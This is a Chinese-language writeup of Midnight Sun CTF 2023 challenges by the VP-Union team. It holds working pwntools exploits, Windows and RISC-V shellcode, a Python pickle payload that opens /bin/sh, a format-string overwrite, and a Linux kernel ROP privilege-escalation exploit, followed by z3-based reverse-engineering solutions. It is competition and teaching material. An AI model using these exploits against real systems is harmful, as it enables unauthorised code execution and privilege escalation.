# Midnight Sun CTF 2023 Writeup by VP-Union

> 原文: https://www.ctfiot.com/108846.html
> ID: 108846

在本次2023年的Midnight Sun CTF国际赛上，星盟安全团队的Polaris战队和ChaMd5的Vemon战队联合参赛，合力组成VP-Union联合战队，勇夺第23名的成绩。

Pwn

pyttemjuk

拿到shell之后，不断输入type c:flag.txt就可以拿到flag了

from pwn import *
from time import sleep

context.log_level = 'debug'

li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

r = remote('pyttemjuk-1.play.hfsc.tf', 1337)
#r = remote('192.168.10.107', 1234)
pause()

gets_plt = 0x40263C
bss_addr = 0x405090

p1 = b'a' * (0x14 + 4 + 0x8)
p1 += p32(gets_plt)
p1 += p32(0x401575)
p1 += p32(bss_addr)

r.sendlineafter('Enter your name: ', p1)

p2 = 'x31xc9x64x8bx41x30x8bx40x0cx8bx40x1cx8bx04x08x8bx04x08x8bx58x08x8bx53x3cx01xdax8bx52x78x01xdax8bx72x20x01xdex41xadx01xd8x81x38x47x65x74x50x75xf4x81x78x04x72x6fx63x41x75xebx81x78x08x64x64x72x65x75xe2x49x8bx72x24x01xdex66x8bx0cx4ex8bx72x1cx01xdex8bx14x8ex01xdax89xd6x31xc9x51x68x45x78x65x63x68x41x57x69x6ex89xe1x8dx49x01x51x53xffxd6x87xfax89xc7x31xc9x51x68x72x65x61x64x68x69x74x54x68x68x41x41x45x78x89xe1x8dx49x02x51x53xffxd6x89xc6x31xc9x51x68x65x78x65x20x68x63x6dx64x2ex89xe1x6ax01x51xffxd7x31xc9x51xffxd6'
#p2 = b'bbbb'
#p2 = 'x31xc9x64x8bx41x30x8bx40x0cx8bx70x14xadx96xadx8bx58x10x8bx53x3cx01xdax8bx52x78x01xdax8bx72x20x01xdex31xc9x41xadx01xd8x81x38x47x65x74x50x75xf4x81x78x04x72x6fx63x41x75xebx81x78x08x64x64x72x65x75xe2x8bx72x24x01xdex66x8bx0cx4ex49x8bx72x1cx01xdex8bx14x8ex01xdax31xf6x89xd6x31xffx89xdfx31xc9x51x68x61x72x79x41x68x4cx69x62x72x68x4cx6fx61x64x54x53xffxd2x83xc4x0cx31xc9x68x65x73x73x42x88x4cx24x03x68x50x72x6fx63x68x45x78x69x74x54x57x31xffx89xc7xffxd6x83xc4x0cx31xc9x51x68x64x6cx6cx41x88x4cx24x03x68x6cx33x32x2ex68x73x68x65x6cx54x31xd2x89xfax89xc7xffxd2x83xc4x0bx31xc9x68x41x42x42x42x88x4cx24x01x68x63x75x74x65x68x6cx45x78x65x68x53x68x65x6cx54x50xffxd6x83xc4x0dx31xc9x68x65x78x65x41x88x4cx24x03x68x63x6dx64x2ex54x59x31xd2x42x52x31xd2x52x52x51x52x52xffxd0xffxd7'
sleep(1)
#p2 = 'x31xc9x64x8bx41x30x8bx40x0cx8bx70x14xadx96xadx8bx48x10x31xdbx8bx59x3cx01xcbx8bx5bx78x01xcbx8bx73x20x01xcex31xd2x42xadx01xc8x81x38x47x65x74x50x75xf4x81x78x04x72x6fx63x41x75xebx81x78x08x64x64x72x65x75xe2x8bx73x1cx01xcex8bx14x96x01xcax89xd6x89xcfx31xdbx68x79x41x41x41x66x89x5cx24x01x68x65x6dx6fx72x68x65x72x6fx4dx68x52x74x6cx5ax54x51xffxd2x83xc4x10x31xc9x89xcaxb2x54x51x83xecx54x8dx0cx24x51x52x51xffxd0x59x31xd2x68x73x41x42x42x66x89x54x24x02x68x6fx63x65x73x68x74x65x50x72x68x43x72x65x61x8dx14x24x51x52x57xffxd6x59x83xc4x10x31xdbx68x65x78x65x41x88x5cx24x03x68x63x6dx64x2ex8dx1cx24x31xd2xb2x44x89x11x8dx51x44x56x31xf6x52x51x56x56x56x56x56x56x53x56xffxd0x5ex83xc4x08x31xdbx68x65x73x73x41x88x5cx24x03x68x50x72x6fx63x68x45x78x69x74x8dx1cx24x53x57xffxd6x31xc9x51xffxd0'
#p2 = 'x31xc9x64xa1x30x00x00x00x8bx40x0cx8bx70x14xadx96xadx8bx58x10x8bx53x3cx01xdax8bx52x78x01xdax8bx72x20x01xdex31xc9x41xadx01xd8x81x38x47x65x74x50x75xf4x81x78x04x72x6fx63x41x75xebx81x78x08x64x64x72x65x75xe2x8bx72x24x01xdex66x8bx0cx4ex49x8bx72x1cx01xdex8bx14x8ex01xdax31xf6x52x5ex31xffx53x5fx31xc9x51x68x78x65x63x00x68x57x69x6ex45x89xe1x51x53xffxd2x31xc9x51x68x65x73x73x00x68x50x72x6fx63x68x45x78x69x74x89xe1x51x57x31xffx89xc7xffxd6x31xf6x50x5ex31xc9x51x68x65x78x65x00x68x63x6dx64x2ex89xe1x6ax00x51xffxd7x6ax00xffxd6xffxffxffxffx00x00x00xffxffxffxffx00x00x00'
#p2 = 'x31xc9x64x8bx41x30x8bx40x0cx8bx70x14xadx96xadx8bx58x10x8bx53x3cx01xdax8bx52x78x01xdax8bx72x20x01xdex31xc9x41xadx01xd8x81x38x47x65x74x50x75xf4x81x78x04x72x6fx63x41x75xebx81x78x08x64x64x72x65x75xe2x8bx72x24x01xdex66x8bx0cx4ex49x8bx72x1cx01xdex8bx14x8ex01xdax31xf6x89xd6x31xc9x51x68x61x72x79x41x68x4cx69x62x72x68x4cx6fx61x64x89xe1x51x53xffxd2x31xc9x66xb9x6cx6cx51x68x72x74x2ex64x68x6dx73x76x63x89xe1x51xffxd0x31xffx89xc7x31xd2x52x66xbax65x6dx52x68x73x79x73x74x89xe1x51x57x31xd2x89xf2xffxd2x31xc9x66xb9x66x6fx51x68x65x6dx69x6ex68x73x79x73x74x89xe1x51xffxd0x31xc9x66xb9x63x68x51x68x5fx67x65x74x89xe1x51x57x31xd2x89xf2xffxd2xffxd0x31xd2x52x68x65x78x69x74x89xe1x51x57xffxd6xffxd0'
r.sendline(p2)

p3 = b'a' * (0x14 + 4)
p3 += p32(bss_addr)
p3 += p32(bss_addr)
r.sendlineafter('Enter your name: ', p3)

sleep(5)
r.sendline('dir')

#r.sendline('calc')
r.interactive()
# midnight{i_prefer_sun_solaris_doors_over_microsoft_windows}

MemeControl

搜索发现有篇文章提到 torch 模块默认启用 pickle ，而 pickle 有任意执行漏洞，搜索找到漏洞利用方法

payload

cos
system
(S'/bin/sh'
tR.
#Y29zCnN5c3RlbQooUycvYmluL3NoJwp0Ui4=

base64 加密后发送

1

SCAAS

先利用 1 功能把程序 保存到本地

from pwn import *
from struct import pack
from ctypes import *
from LibcSearcher import *
import base64

def s(a):
    p.send(a)
def sa(a, b):
    p.sendafter(a, b)
def sl(a):
    p.sendline(a)
def sla(a, b):
    p.sendlineafter(a, b)
def r():
    p.recv()
def pr():
    print(p.recv())
def rl(a):
    return p.recvuntil(a)
def inter():
    p.interactive()
def debug():
    gdb.attach(p)
    pause()
def get_addr():
    return u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))
def get_sb():
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))

context(os='windows', arch='i386', log_level='debug')
#p = process('./pwn')
p = remote('scaas-1.play.hfsc.tf', 1337)
elf = ELF('./pwn')
#libc = ELF('./libc-2.27-x64.so')
#libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so')
sla(b'> ', b'1')
rl(b'Here is your SCAAS service: (n')
text = b''
for i in range(83):
    text += rl(b'n')[:-1]
a = base64.b64decode(text)

with open('./pwn', 'rb+') as f:
    f.write(a)

发现是一个压缩包，解压后得到程序文件。

对着文件开始逆向

2

推测程序是要经过三步验证，然后输入纯字符 + 数字 shellcode

输入的 password 则对应 retun 的返回值，这里明显需要令等式成立

3

到 stage 3 这里会比较坑

4

需要一个数与 8511 相乘，然而该程序是 32 位的，很容易爆寄存器能存放的数的最大值导致最后 cmp 时候出错。这里只需要模拟下寄存器溢出时候的情况。

for i in range(0xfffffff):
    a = 8511 * i
    if a > 0xffffffff:
        b = str(hex(a))
        c = b[-8:]
        d = int(c, 16)
        if d % 0x2B27EA == 24486:
            print(i)

然后就能输入 shellcode 了。

from pwn import *
from struct import pack
from ctypes import *
from LibcSearcher import *
import base64

def s(a):
    p.send(a)
def sa(a, b):
    p.sendafter(a, b)
def sl(a):
    p.sendline(a)
def sla(a, b):
    p.sendlineafter(a, b)
def r():
    p.recv()
def pr():
    print(p.recv())
def rl(a):
    return p.recvuntil(a)
def inter():
    p.interactive()
def debug():
    gdb.attach(p)
    pause()
def get_addr():
    return u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))
def get_sb():
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))

context(os='linux', arch='i386', log_level='debug')
#p = process('./pwn')
p = remote('scaas-1.play.hfsc.tf', 1337)
elf = ELF('./pwn')
#libc = ELF('./libc-2.27-x64.so')
#libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so')

#gdb.attach(p, 'b *$rebase(0x1609)')

sla(b'> ', b'2')
sla(b'0: ', str(0x916D00))
sla(b'1: ', str(0x707817))
sla(b'2: ', str(1))
sla(b'3: ', str(0x840BC2))
sla(b'4: ', str(0x89228A))

sla(b'0: ', str(1243932))
sla(b'1: ', str(3103430))
sla(b'2: ', str(262505 - 456))
sla(b'3: ', str(262505))
sla(b'4: ', str(0x2b7))

sla(b'0: ', str(2124890))
sla(b'1: ', str(9874561))
sla(b'2: ', str(6280405 + 3274 + 4728))
sla(b'3: ', str(6280405))
sla(b'4: ', str(0))

sla(b'bytes): ', 'PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA')
inter()
#pause()

5

SPD A

mmap 一段 rw 权限内存后，可以写入 0x1000 字节，然后 mprotect 为 x 权限，对寄存器赋值后执行写入的 shellcode。对写入的 shellcode 有检测，并且发现寄存器赋值后 rsp 还是指向栈，于是利用 orw 来读 flag

from pwn import *
from struct import pack
from ctypes import *
from LibcSearcher import *
import base64

def s(a):
    p.send(a)
def sa(a, b):
    p.sendafter(a, b)
def sl(a):
    p.sendline(a)
def sla(a, b):
    p.sendlineafter(a, b)
def r():
    p.recv()
def pr():
    print(p.recv())
def rl(a):
    return p.recvuntil(a)
def inter():
    p.interactive()
def debug():
    gdb.attach(p)
    pause()
def get_addr():
    return u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))
def get_sb():
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))

context(os='linux', arch='amd64'', log_level='debug')
#p = process('./pwn')
p = remote('scaas-1.play.hfsc.tf', 1337)
elf = ELF('./pwn')
#libc = ELF('./libc-2.27-x64.so')
#libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so')
#gdb.attach(p, 'b *$rebase(0x15ac)')
sa(b'c0de: ', asm(shellcraft.open('flag') + shellcraft.read(3, 'rsp', 0x30) + shellcraft.write(1, 'rsp', 0x30)))
pr()
#pause()

6

SPD B

一次程序三次格式化字符串漏洞机会，但是最多只能写入 12 字节，并且一次修改太大会卡栈。

并且由于 12 字节太少，用 %k

的方式修改当前函数的返回地址肯定是会不够写的，用hhn 的方式写一个字节也肯定是不行的

加上我们是可以修改 for 循环用的 i 修改为 0 的，这样我们就可以无限循环触发格式化字符串漏洞了。

于是先修改栈上的 链子 使其指向 main 函数的 返回地址，将其修改为后门函数

from pwn import *
from struct import pack
from ctypes import *
from LibcSearcher import *
import base64

def s(a):
    p.send(a)
def sa(a, b):
    p.sendafter(a, b)
def sl(a):
    p.sendline(a)
def sla(a, b):
    p.sendlineafter(a, b)
def r():
    p.recv()
def pr():
    print(p.recv())
def rl(a):
    return p.recvuntil(a)
def inter():
    p.interactive()
def debug():
    gdb.attach(p)
    pause()
def get_addr():
    return u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))
def get_sb():
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))

context(os='linux', arch='i386', log_level='debug')
#p = process('./pwn')
p = remote('spdb-1.play.hfsc.tf', 40002)
elf = ELF('./pwn')
#libc = ELF('./libc-2.27-x64.so')
#libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so')

#
sla(b'guess: ', b'%1$p%3$p')
rl(b'0x')
stack = int(p.recv(8), 16)
ret = stack + 0xdc
vuln_ret = stack + 0x8c
i = stack + 0xac
rl(b'0x')
pro_base = int(p.recv(8), 16) - 0x1311
shell = pro_base + 0x138D

sla(b'guess: ', b'%5$n' + p32(i))
payload = b'%' + str(ret & 0xff).encode() + b'c%18$hhn'
sla(b'guess: ', payload)
sla(b'guess: ', b'%5$n' + p32(i))
payload = b'%' + str(shell & 0xff).encode() + b'c%34$hn'
sla(b'guess: ', payload)

sla(b'guess: ', b'%5$n' + p32(i))
payload = b'%' + str((ret + 1) & 0xff).encode() + b'c%18$hhn'
sla(b'guess: ', payload)
sla(b'guess: ', b'%5$n' + p32(i))
payload = b'%' + str((shell >> 8) & 0xff).encode() + b'c%34$hn'
sla(b'guess: ', payload)

sla(b'guess: ', b'%5$n' + p32(i))
payload = b'%' + str((ret + 2) & 0xff).encode() + b'c%18$hhn'
sla(b'guess: ', payload)
sla(b'guess: ', b'%5$n' + p32(i))
payload = b'%' + str((shell >> 16) & 0xff).encode() + b'c%34$hn'
sla(b'guess: ', payload)

sla(b'guess: ', b'%5$n' + p32(i))
payload = b'%' + str((ret + 3) & 0xff).encode() + b'c%18$hhn'
sla(b'guess: ', payload)
payload = b'%' + str((shell >> 24) & 0xff).encode() + b'c%34$hn'
sla(b'guess: ', payload)

inter()
#gdb.attach(p, 'b *$rebase(0x1369)')
print(' stack -> ', hex(stack))
print(' ret -> ', hex(ret))
print(' pro_base -> ', hex(pro_base))
#pause()

SPD C

7

riscv64 架构题，看到 c0de 联想到 SPD A 猜想是写入 shellcode

网上找到 shellcode 写入拿到 shell（https://xz.aliyun.com/t/8977#toc-4）

from pwn import *
from struct import pack
from ctypes import *
from LibcSearcher import *
import base64

def s(a):
    p.send(a)
def sa(a, b):
    p.sendafter(a, b)
def sl(a):
    p.sendline(a)
def sla(a, b):
    p.sendlineafter(a, b)
def r():
    p.recv()
def pr():
    print(p.recv())
def rl(a):
    return p.recvuntil(a)
def inter():
    p.interactive()
def debug():
    gdb.attach(p)
    pause()
def get_addr():
    return u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))
def get_sb():
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))

context(os='linux', arch='amd64', log_level='debug')
#p = process(['qemu-riscv64', './pwn'])
p = remote('spdc-1.play.hfsc.tf', 40003)
elf = ELF('./pwn')
#libc = ELF('./libc-2.27-x64.so')
#libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so')

shellcode = b"x01x11x06xecx22xe8x13x04x21x02xb7x67x69x6ex93x87xf7x22x23x30xf4xfexb7x77x68x10x33x48x08x01x05x08x72x08xb3x87x07x41x93x87xf7x32x23x32xf4xfex93x07x04xfex01x46x81x45x3ex85x93x08xd0x0dx73x00x00x00"

sla(b'c0de: ', shellcode)

inter()

SPD D

一道内核题目，查看发现没开什么内核保护，驱动也只开了 NX 保护。

8

漏洞是一个很明显的栈溢出。

没有开启 kalsr，直接 kernel rop，最后利用 kpti_trampoline 绕过保护并且返回用户态

#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>
#include <signal.h>
#include <unistd.h>
#include <syscall.h>
#include <pthread.h>
#include <poll.h>
#include <linux/userfaultfd.h>
#include <linux/fs.h>
#include <sys/shm.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#define ut uint64_t

void backdoor(){
    system("/bin/sh");
}
void get_root(){
    __asm__(
        "mov rdi, 0;"
        "mov rax, 0xffffffff81055db0;"
        "call rax;"
        "mov rdi, rax;"
        "mov rax, 0xffffffff81055f00;"
        "call rax;"
            );
}
ut user_cs, user_ss, user_rsp, user_flag;
void save_status(){
    __asm__(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_rsp, rsp;"
        "pushf;"
        "pop user_flag;"
            );
}
int main(){
    save_status();
    int fd = open("/dev/vuln", 2);
    ut buf[50] = {0};
    buf[33] = (ut)get_root;
    buf[34] = 0xffffffff81400c36; //kpti_trampoline
    buf[35] = 0;
    buf[36] = 0;
    buf[37] = (ut)backdoor;
    buf[38] = user_cs;
    buf[39] = user_flag;
    buf[40] = user_rsp;
    buf[41] = user_ss;

    write(fd, buf, sizeof(buf));
    puts("[+]root");
    return 0;
}

最后利用 musl 编译，上传执行拿到 flag

midnight{964fe6242ca987d24f0fdfd851983c68}

Reverse

Pressure

本质上这个题目是通过内存加载多个elf文件来进行实现整个加密过程，我们打开文件可以发现

题目通过sub_55A78CFBA2C9对内存进行解密，在调试过程中可以从内存中查看到有两个elf文件的信息，我们编写一个idc脚本进行提取：

static main(void)
{
  auto fp, begin, end, dexbyte;
  fp = fopen("C:\Users\Equinox\Desktop\elf", "wb");
  begin = 0x07F84B1E76010;
  end = begin + 0x4ff88;
  for ( dexbyte = begin; dexbyte < end; dexbyte ++ )
      fputc(Byte(dexbyte), fp);
}

之后我们每次拿到的elf文件中都是上面的格式，有些elf中没有信息，大概能提取出16个elf

其中的加密逻辑都是下面的if进行条件判断，我们分别对其进行解密即可

from z3 import *
from ctypes import *
from Crypto.Util.number import long_to_bytes
a1 = BitVec('flag', 16)
s = Solver()
# def check1(): #'_u'
#     v3 = 0
#     for  i in range(16):
#         v4 = ((1 << i) & a1) >> i
#         if  (i & 3) != 0 :
#             if  i % 4 == 1 :
#                 v3 |= ((((1 << i) & 0xA55A) >> i) ^ v4) << i  
#             else:
#                 if  i % 4 == 2 :
#                     v1 = ((((1 << i) & 0xA55A) >> i) ^ v4) << i
#                 else:
#                     v1 = ((((1 << i) & 0x5AA5) >> i) ^ v4) << i
#                 v3 |= v1
#         else:
#             v3 |= ((((1 << i) & 0x5AA5) >> i) ^ v4) << i
#     s.add(v3 == 0x63B6)

def check2(): #b'3b'
    # v3 = 0
    # v4 = 1
    # for i in range(16):
    #     if (v4 & a1) != 0 :
    #         v1 = 0
    #     else:
    #         v1 = v4
    #     v3 |= v1
    #     v4 *= 2
    # s.add(v3 == 0xFFFFCC9D)
    
    for i in range(65535):
        v3 = 0
        v4 = 1
        for j in range(16):
            if v4 & i != 0 :
                v1 = 0
            else:
                v1 = v4
            v3 |= v1
            v4 *= 2
            v4 &= 0xFFFF
        if v3 == 0xCC9D:
            print(i)
            break

def check3(): # b't4'
    for i in range(65535):
        t = i
        for j in range(16):
            v4 = t & 1
            t >>= 1
            if  v4 :
                t ^= 0xB400
        if t == 18718:
            print(i)
            break
    #s.add(a1 == 18718) 

def check4():
    a2 = 0x1337
    for i in range(65535):
        t = i
        if ((t << 8)&0xffff | ((a2 + t) ^ ((t >> 8) & 0xff))&0xffff)&0xffff == 24546:
            print(i)
            break
 # s.add(((a1 << 8) | ((a2 + a1) ^ (a1 >> 8 & 0xff))) == 24546)

def check5(): # b'3h'
#     if a1&1 != 0:
#        a2 = 3
#        s.add(((a1 << a2) | (a1 >> (16 - a2))) == 107808365) 
#     else:
#         a2 = 3
#         s.add((a1 >> a2 == 107808365) | (a1 << (16 - a2)))
    for i in range(65535):
        t = i
        # if t&1 != 0:
        #     a2 = 3
        #     if ((t << a2) | (t >> (16 - a2))) == 107808365:
        #         print(i)
        #         break
        # else:
        a2 = 3
        if (t >> a2) == (107808365 &0xffff):
            print(i)
            break

def check6(): # b'c_'
    v2 = 0
    for i in range(16):
        v2 |= ((a1 >> i) & 1) << (15 - i)     
    s.add(v2 == 64198)

def check7(): # b'xf0x0c'
#     s.add(a1^0xf00d == 1)
    for i in range(65535):
        t = i
        if (t^0xf00d) == 1:
            print(i)
            

# def check8(): #kc
#     a2 = 0x6907
#     s.add(((16 * ((((a1 >> 4) & 0xF) + ((a2 >> 4) & 0xF)) & 0xF)) | (((((a1 >> 8 &0xff) & 0xF) + ((a2>> 8 &0xff) & 0xF)) & 0xF) << 8) | ((((a2 >> 12) * (a1 >> 12)) & 0xF) << 12) | ((a2 & 0xF) * (a1 & 0xF)) & 0xF) == 17509)
#     a2 = 0x9231
#     s.add(((16 * ((((a1 >> 4) & 0xF) + ((a2 >> 4) & 0xF)) & 0xF)) | (((((a1 >> 8 &0xff) & 0xF) + ((a2 >> 8 &0xff) & 0xF)) & 0xF) << 8) | ((((a2 >> 12) * (a1 >> 12)) & 0xF) << 12) | ((a2 & 0xF) * (a1 & 0xF)) & 0xF)== 28051)

check4()
# print(s.check())
# print(s.model())
print(long_to_bytes(13160))

#_u3bt4  3hc_  kc
#u_b34t_th3_crack

大致看看上面代码就行（逻辑太混了点）

通过z3以及手动爆破的方式可以得到下面的字符串(题目存在多解，但是下面的输入都是能够success，提交怎么都不对)

于是转头去问出题人，于是把下面的cr4ck替换一下，换成c10ck即可

Open Source Software

题目给出了C语言源代码，使用define定义了很多表达式，可以直接用z3计算，给出exp

from z3 import *

def rol_4(R2K):
    return (((R2K)<<4)|((R2K)>>4))
def xor_byte(A9W,B8X):
    return (((A9W)^(B8X))&0xff)
def Y2G(A9W,B8X):
    return ((A9W)&0x55)|(((B8X)&0xaa)>>1)
def W4U(A9W,B8X):
    return ((((A9W)*(B8X))%1257)&0xff)
def V5H(T3S):
    return (((T3S)<<1)|((T3S)>>7))
def S6E(T3S):
    return (((T3S)<<3)^((T3S)>>5))
def D7F(A9W,B8X):
    return (((A9W)<<4)^(B8X))
def A1C(P6F,Q5G,R4H,S3I):
    return rol_4(W4U(V5H(rol_4(Y2G(V5H(xor_byte(P6F,Q5G)),V5H(xor_byte(R4H,S3I))))),Q5G))
def B2D(P6F,Q5G):
    return V5H(rol_4(xor_byte(P6F,Q5G)))
def C3E(P6F,Q5G):
    return D7F(Q5G,rol_4(xor_byte(P6F,Q5G)))
def D4F(P6F,Q5G):
    return ((P6F)^(Q5G))
def F2J(K2L):
    return (V5H(rol_4(K2L)))
def E1I(K2L, q1s):
    return W4U(V5H(rol_4(K2L)), q1s)
def G3K(K2L):
    return S6E(K2L)

s = Solver()

flag =  [BitVec(('flag%s' % i),32) for i in range(24) ]
#flag =  [Int(('flag%s' % i)) for i in range(24) ]

p5f=[16,0,8,20,14,12,18,2,22,10,6,4]
i = 0
j9n = [0x1010, 024050, 034070, 28784, 0x12d2d, 0x10d0d, 042104, 012024, 0xc4c4, 0156334, 0x16161, 0270561]
g7k = [0,0,0,0,0,0]
h8m = [0,0,0,0,0,0]

for i in range(0,24):
    s.add(flag[i] > 32)
    s.add(flag[i] < 128)

for i in range(0, 24, 4):
    if i < 12:
        s.add(F2J(B2D(flag[p5f[i+3]],flag[p5f[i+3]+1])) == j9n[p5f[i+3]/2])
        g7k[i/4]=D4F(C3E(flag[i*2],flag[i*2+2]),C3E(flag[i*2+4],flag[i*2+6]))
        g7k[(i/4)+3]= D4F(C3E(flag[i*2+1],flag[i*2+3]),C3E(flag[i*2+5],flag[i*2+7]))
        s.add(F2J(B2D(flag[p5f[i+1]],flag[p5f[i+1]+1])) == j9n[p5f[i+1]/2])
        s.add(F2J(B2D(flag[p5f[i+2]],flag[p5f[i+2]+1])) == j9n[p5f[i+2]/2])
        s.add(F2J(B2D(flag[p5f[i]],flag[p5f[i]+1])) == j9n[p5f[i]/2])
        if i<4:
            h8m[i/4]=A1C(flag[i],flag[i+4],flag[i+8],flag[i+12])
        if i==4:
            h8m[1]=A1C(flag[16],flag[20],flag[1],flag[5])
    else:
        if i < 16:
            h8m[i/6]=A1C(flag[i-3],flag[i+1],flag[i+5],flag[i*2-3])
            h8m[3]=A1C(flag[2],flag[6],flag[10],flag[14])
h8m[4]=A1C(flag[18],flag[22],flag[3],flag[7])
h8m[5]=A1C(flag[11],flag[15],flag[19],flag[23])

s.add(E1I(h8m[0], 1) == 0x5b)
s.add(E1I(h8m[1], 2) == 13)
s.add(E1I(h8m[2], 3) == 0x5D)
s.add(E1I(h8m[3], 4) == 0244)
s.add(E1I(h8m[4], 5) == 52)
s.add(E1I(h8m[5], 6) ==0xDC)

mul_num = 0
for i in range(24):
    mul_num = ((mul_num*251)^flag[i]) & 0xffffffff

s.add(mul_num == 0x4E6F76D0)

s.add(G3K(g7k[0])==0x202)
s.add(G3K(g7k[1])==0x1aa2)
s.add(G3K(g7k[2])==0x5a5)
s.add(G3K(g7k[3])==03417)
s.add(G3K(g7k[4])==0x3787)
s.add(G3K(g7k[5])==030421)
s.add(flag[0] == 109)
s.add(flag[1] == 105)
s.add(flag[2] == 100)
s.add(flag[3] == 110)
s.add(flag[4] == 105)
s.add(flag[5] == 103)
s.add(flag[6] == 104)
s.add(flag[7] == 116)
s.add(flag[8] == 123)
s.add(flag[23] == 125)

print(s)
print(s.check())
m = s.model()
print m
for i in range(0,24):
    print (chr(int("%s" % (m[flag[i]]))))

expectations

通过注册一系列的异常处理来修改 magic 的值，然后这个值会拿去乘输入来验证是否正确。

switch ( (i + 1) * (v7 % 6) % 6 )
    {
      case 0:
        if ( !_setjmp(env) )
          magic = dword_559E227B81A8 / 0;       // 857 check SIGFPE
        break;
      case 1:
        magic = 99;
        if ( !_setjmp(env) )
          BUG();                                // 841 check SIGILL
        return result;
      case 2:
        if ( !_setjmp(env) )
          magic = (1.797693134862316e308 * dword_559E227B81A4 + dword_559E227B81A8);// 0x80000000
        break;
      case 3:                                   // 1
        _setjmp(env);
        ++magic;
        break;
      case 4:
        if ( !_setjmp(env) )
        {
          v3 = dword_559E227B81A8 - (dword_559E227B81A4 * dword_559E227B81AC) / 0.0;// 0x80000000
          magic = v3;
        }
        break;
      case 5:
        if ( !_setjmp(env) )
          sub_559E227B547A();                   // 981 check SIGSEGV
        return result;
      default:
        break;
    }

但是有一个地方需要注意的是，虽然有些分支会改成 0x80000000，但是这个数会被拓展为 0xffffffff80000000，在爆破字节的时候，前者是求不出结果的，而后者可以。

mov edx, cs:magic
movsxd rdx, edx

所以最后甚至可以手搓。前几个字节是 midnight{ ，其中，前八个会用来生成一个序列，然后第九个字节就能进行验证了。此后的每一个输入都在验证，因此甚至可以直接手搓。每个字节似乎都能有两个可能，选出其中有意义的密文就可以了。

然后另外一点是，最终的输出是拿计算结果去校验的，通过这个方法保证了唯一解。不然实际上好几个输入都能让它显示 All characters processed. 的。

最后写一个深搜搞定了：

#include <iostream>
#include<vector>
using namespace std;
unsigned char ida_chars[] =
{
  0xF5, 0x9B, 0x12, 0xAF, 0x7A, 0x23, 0x59, 0x8E, 0x1B, 0x17,
  0x03, 0x19, 0x09, 0x05, 0x2C, 0x3E, 0x0E, 0x38, 0x28, 0x05,
  0x2C, 0x3E, 0x0E, 0x38, 0x40, 0x17, 0x28, 0x27, 0x11, 0x0D,
  0x26, 0x25, 0x35, 0x33, 0x09, 0x38, 0x19, 0x2C, 0x40, 0x08,
  0x3E, 0x0E, 0x38, 0x1E, 0x40, 0x08, 0x3E, 0x0E, 0x38, 0x1B,
  0x09, 0x19, 0x27, 0x21, 0x0D, 0x1B, 0x25, 0x35, 0x3A, 0xD1,
  0x04, 0xF8, 0xBC, 0x34, 0x23, 0x38, 0xEB, 0x98, 0x48, 0x14,
  0x32, 0x95, 0x7B, 0x91, 0x8D, 0x82, 0x9F, 0x86, 0xF8, 0x91,
  0xC8, 0x78, 0xDE, 0x4E, 0x21, 0xAA, 0xFB, 0x5B
};
vector<char> flagn;
unsigned long long  magic[] = { 0x359 ,841 ,0xffffffff80000000,1,0xffffffff80000000 ,981 };
int get_byte = 0;
int start = 0;
int break_triger = 0;
void dfs(int depeth,int pre,int num) {
 if (num == 25)
 {
  for(int i=0;i<25;i++)
  {
   printf("%c", flagn[i]);
  }
  printf("n");
  return;
 }
 int key = (depeth + 1) * pre % 6;
 int flag = 0;
 for (int i = 32; i < 126; i++)
 {
  if (((i + 177573LL) * magic[key]) % 0x41 == ida_chars[depeth])
  {
   char re = i;
   flagn.push_back(re);
   flag=1;
   dfs(depeth+1,i,num+1);
   flagn.pop_back();
  }
 }
 if (flag == 0)return;
}

int main() {
 dfs(9,123, 0);
}

好巧不巧正好是最后一个，或许我应该直接从小写字符开始爆破的。

Crypto

Mt. Random

源代码如下。

<?php
session_start();

$flag = "";

function flag_to_numbers($flag) {
    $numbers = [];
    foreach (str_split($flag) as $char) {
        $numbers[] = ord($char);
    }
    return $numbers;
}

function non_continuous_sample($min, $max, $gap_start, $gap_end) {
    $rand_num = mt_rand($min, $max - ($gap_end - $gap_start));
    if ($rand_num >= $gap_start) {
        $rand_num += ($gap_end - $gap_start);
    }
    return $rand_num;
}

if(!str_starts_with($flag, "midnight{")){
    echo "Come back later.n";
    exit();
}

$flag_numbers = flag_to_numbers($flag);

if (isset($_GET['generate_samples'])) {
    header('Content-Type: application/json');

    // Maybe we can recover these constants 
    $min = 0;
    $max = 0;
    $gap_start = 0;
    $gap_end = 0;
    $seed = mt_rand(0, 10000); // Varying seed
    $samples = [];

    foreach ($flag_numbers as $number) {
        mt_srand($seed + $number);
        $samples[] = non_continuous_sample($min, $max, $gap_start, $gap_end);
    }

    echo json_encode(["samples" => $samples]);
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
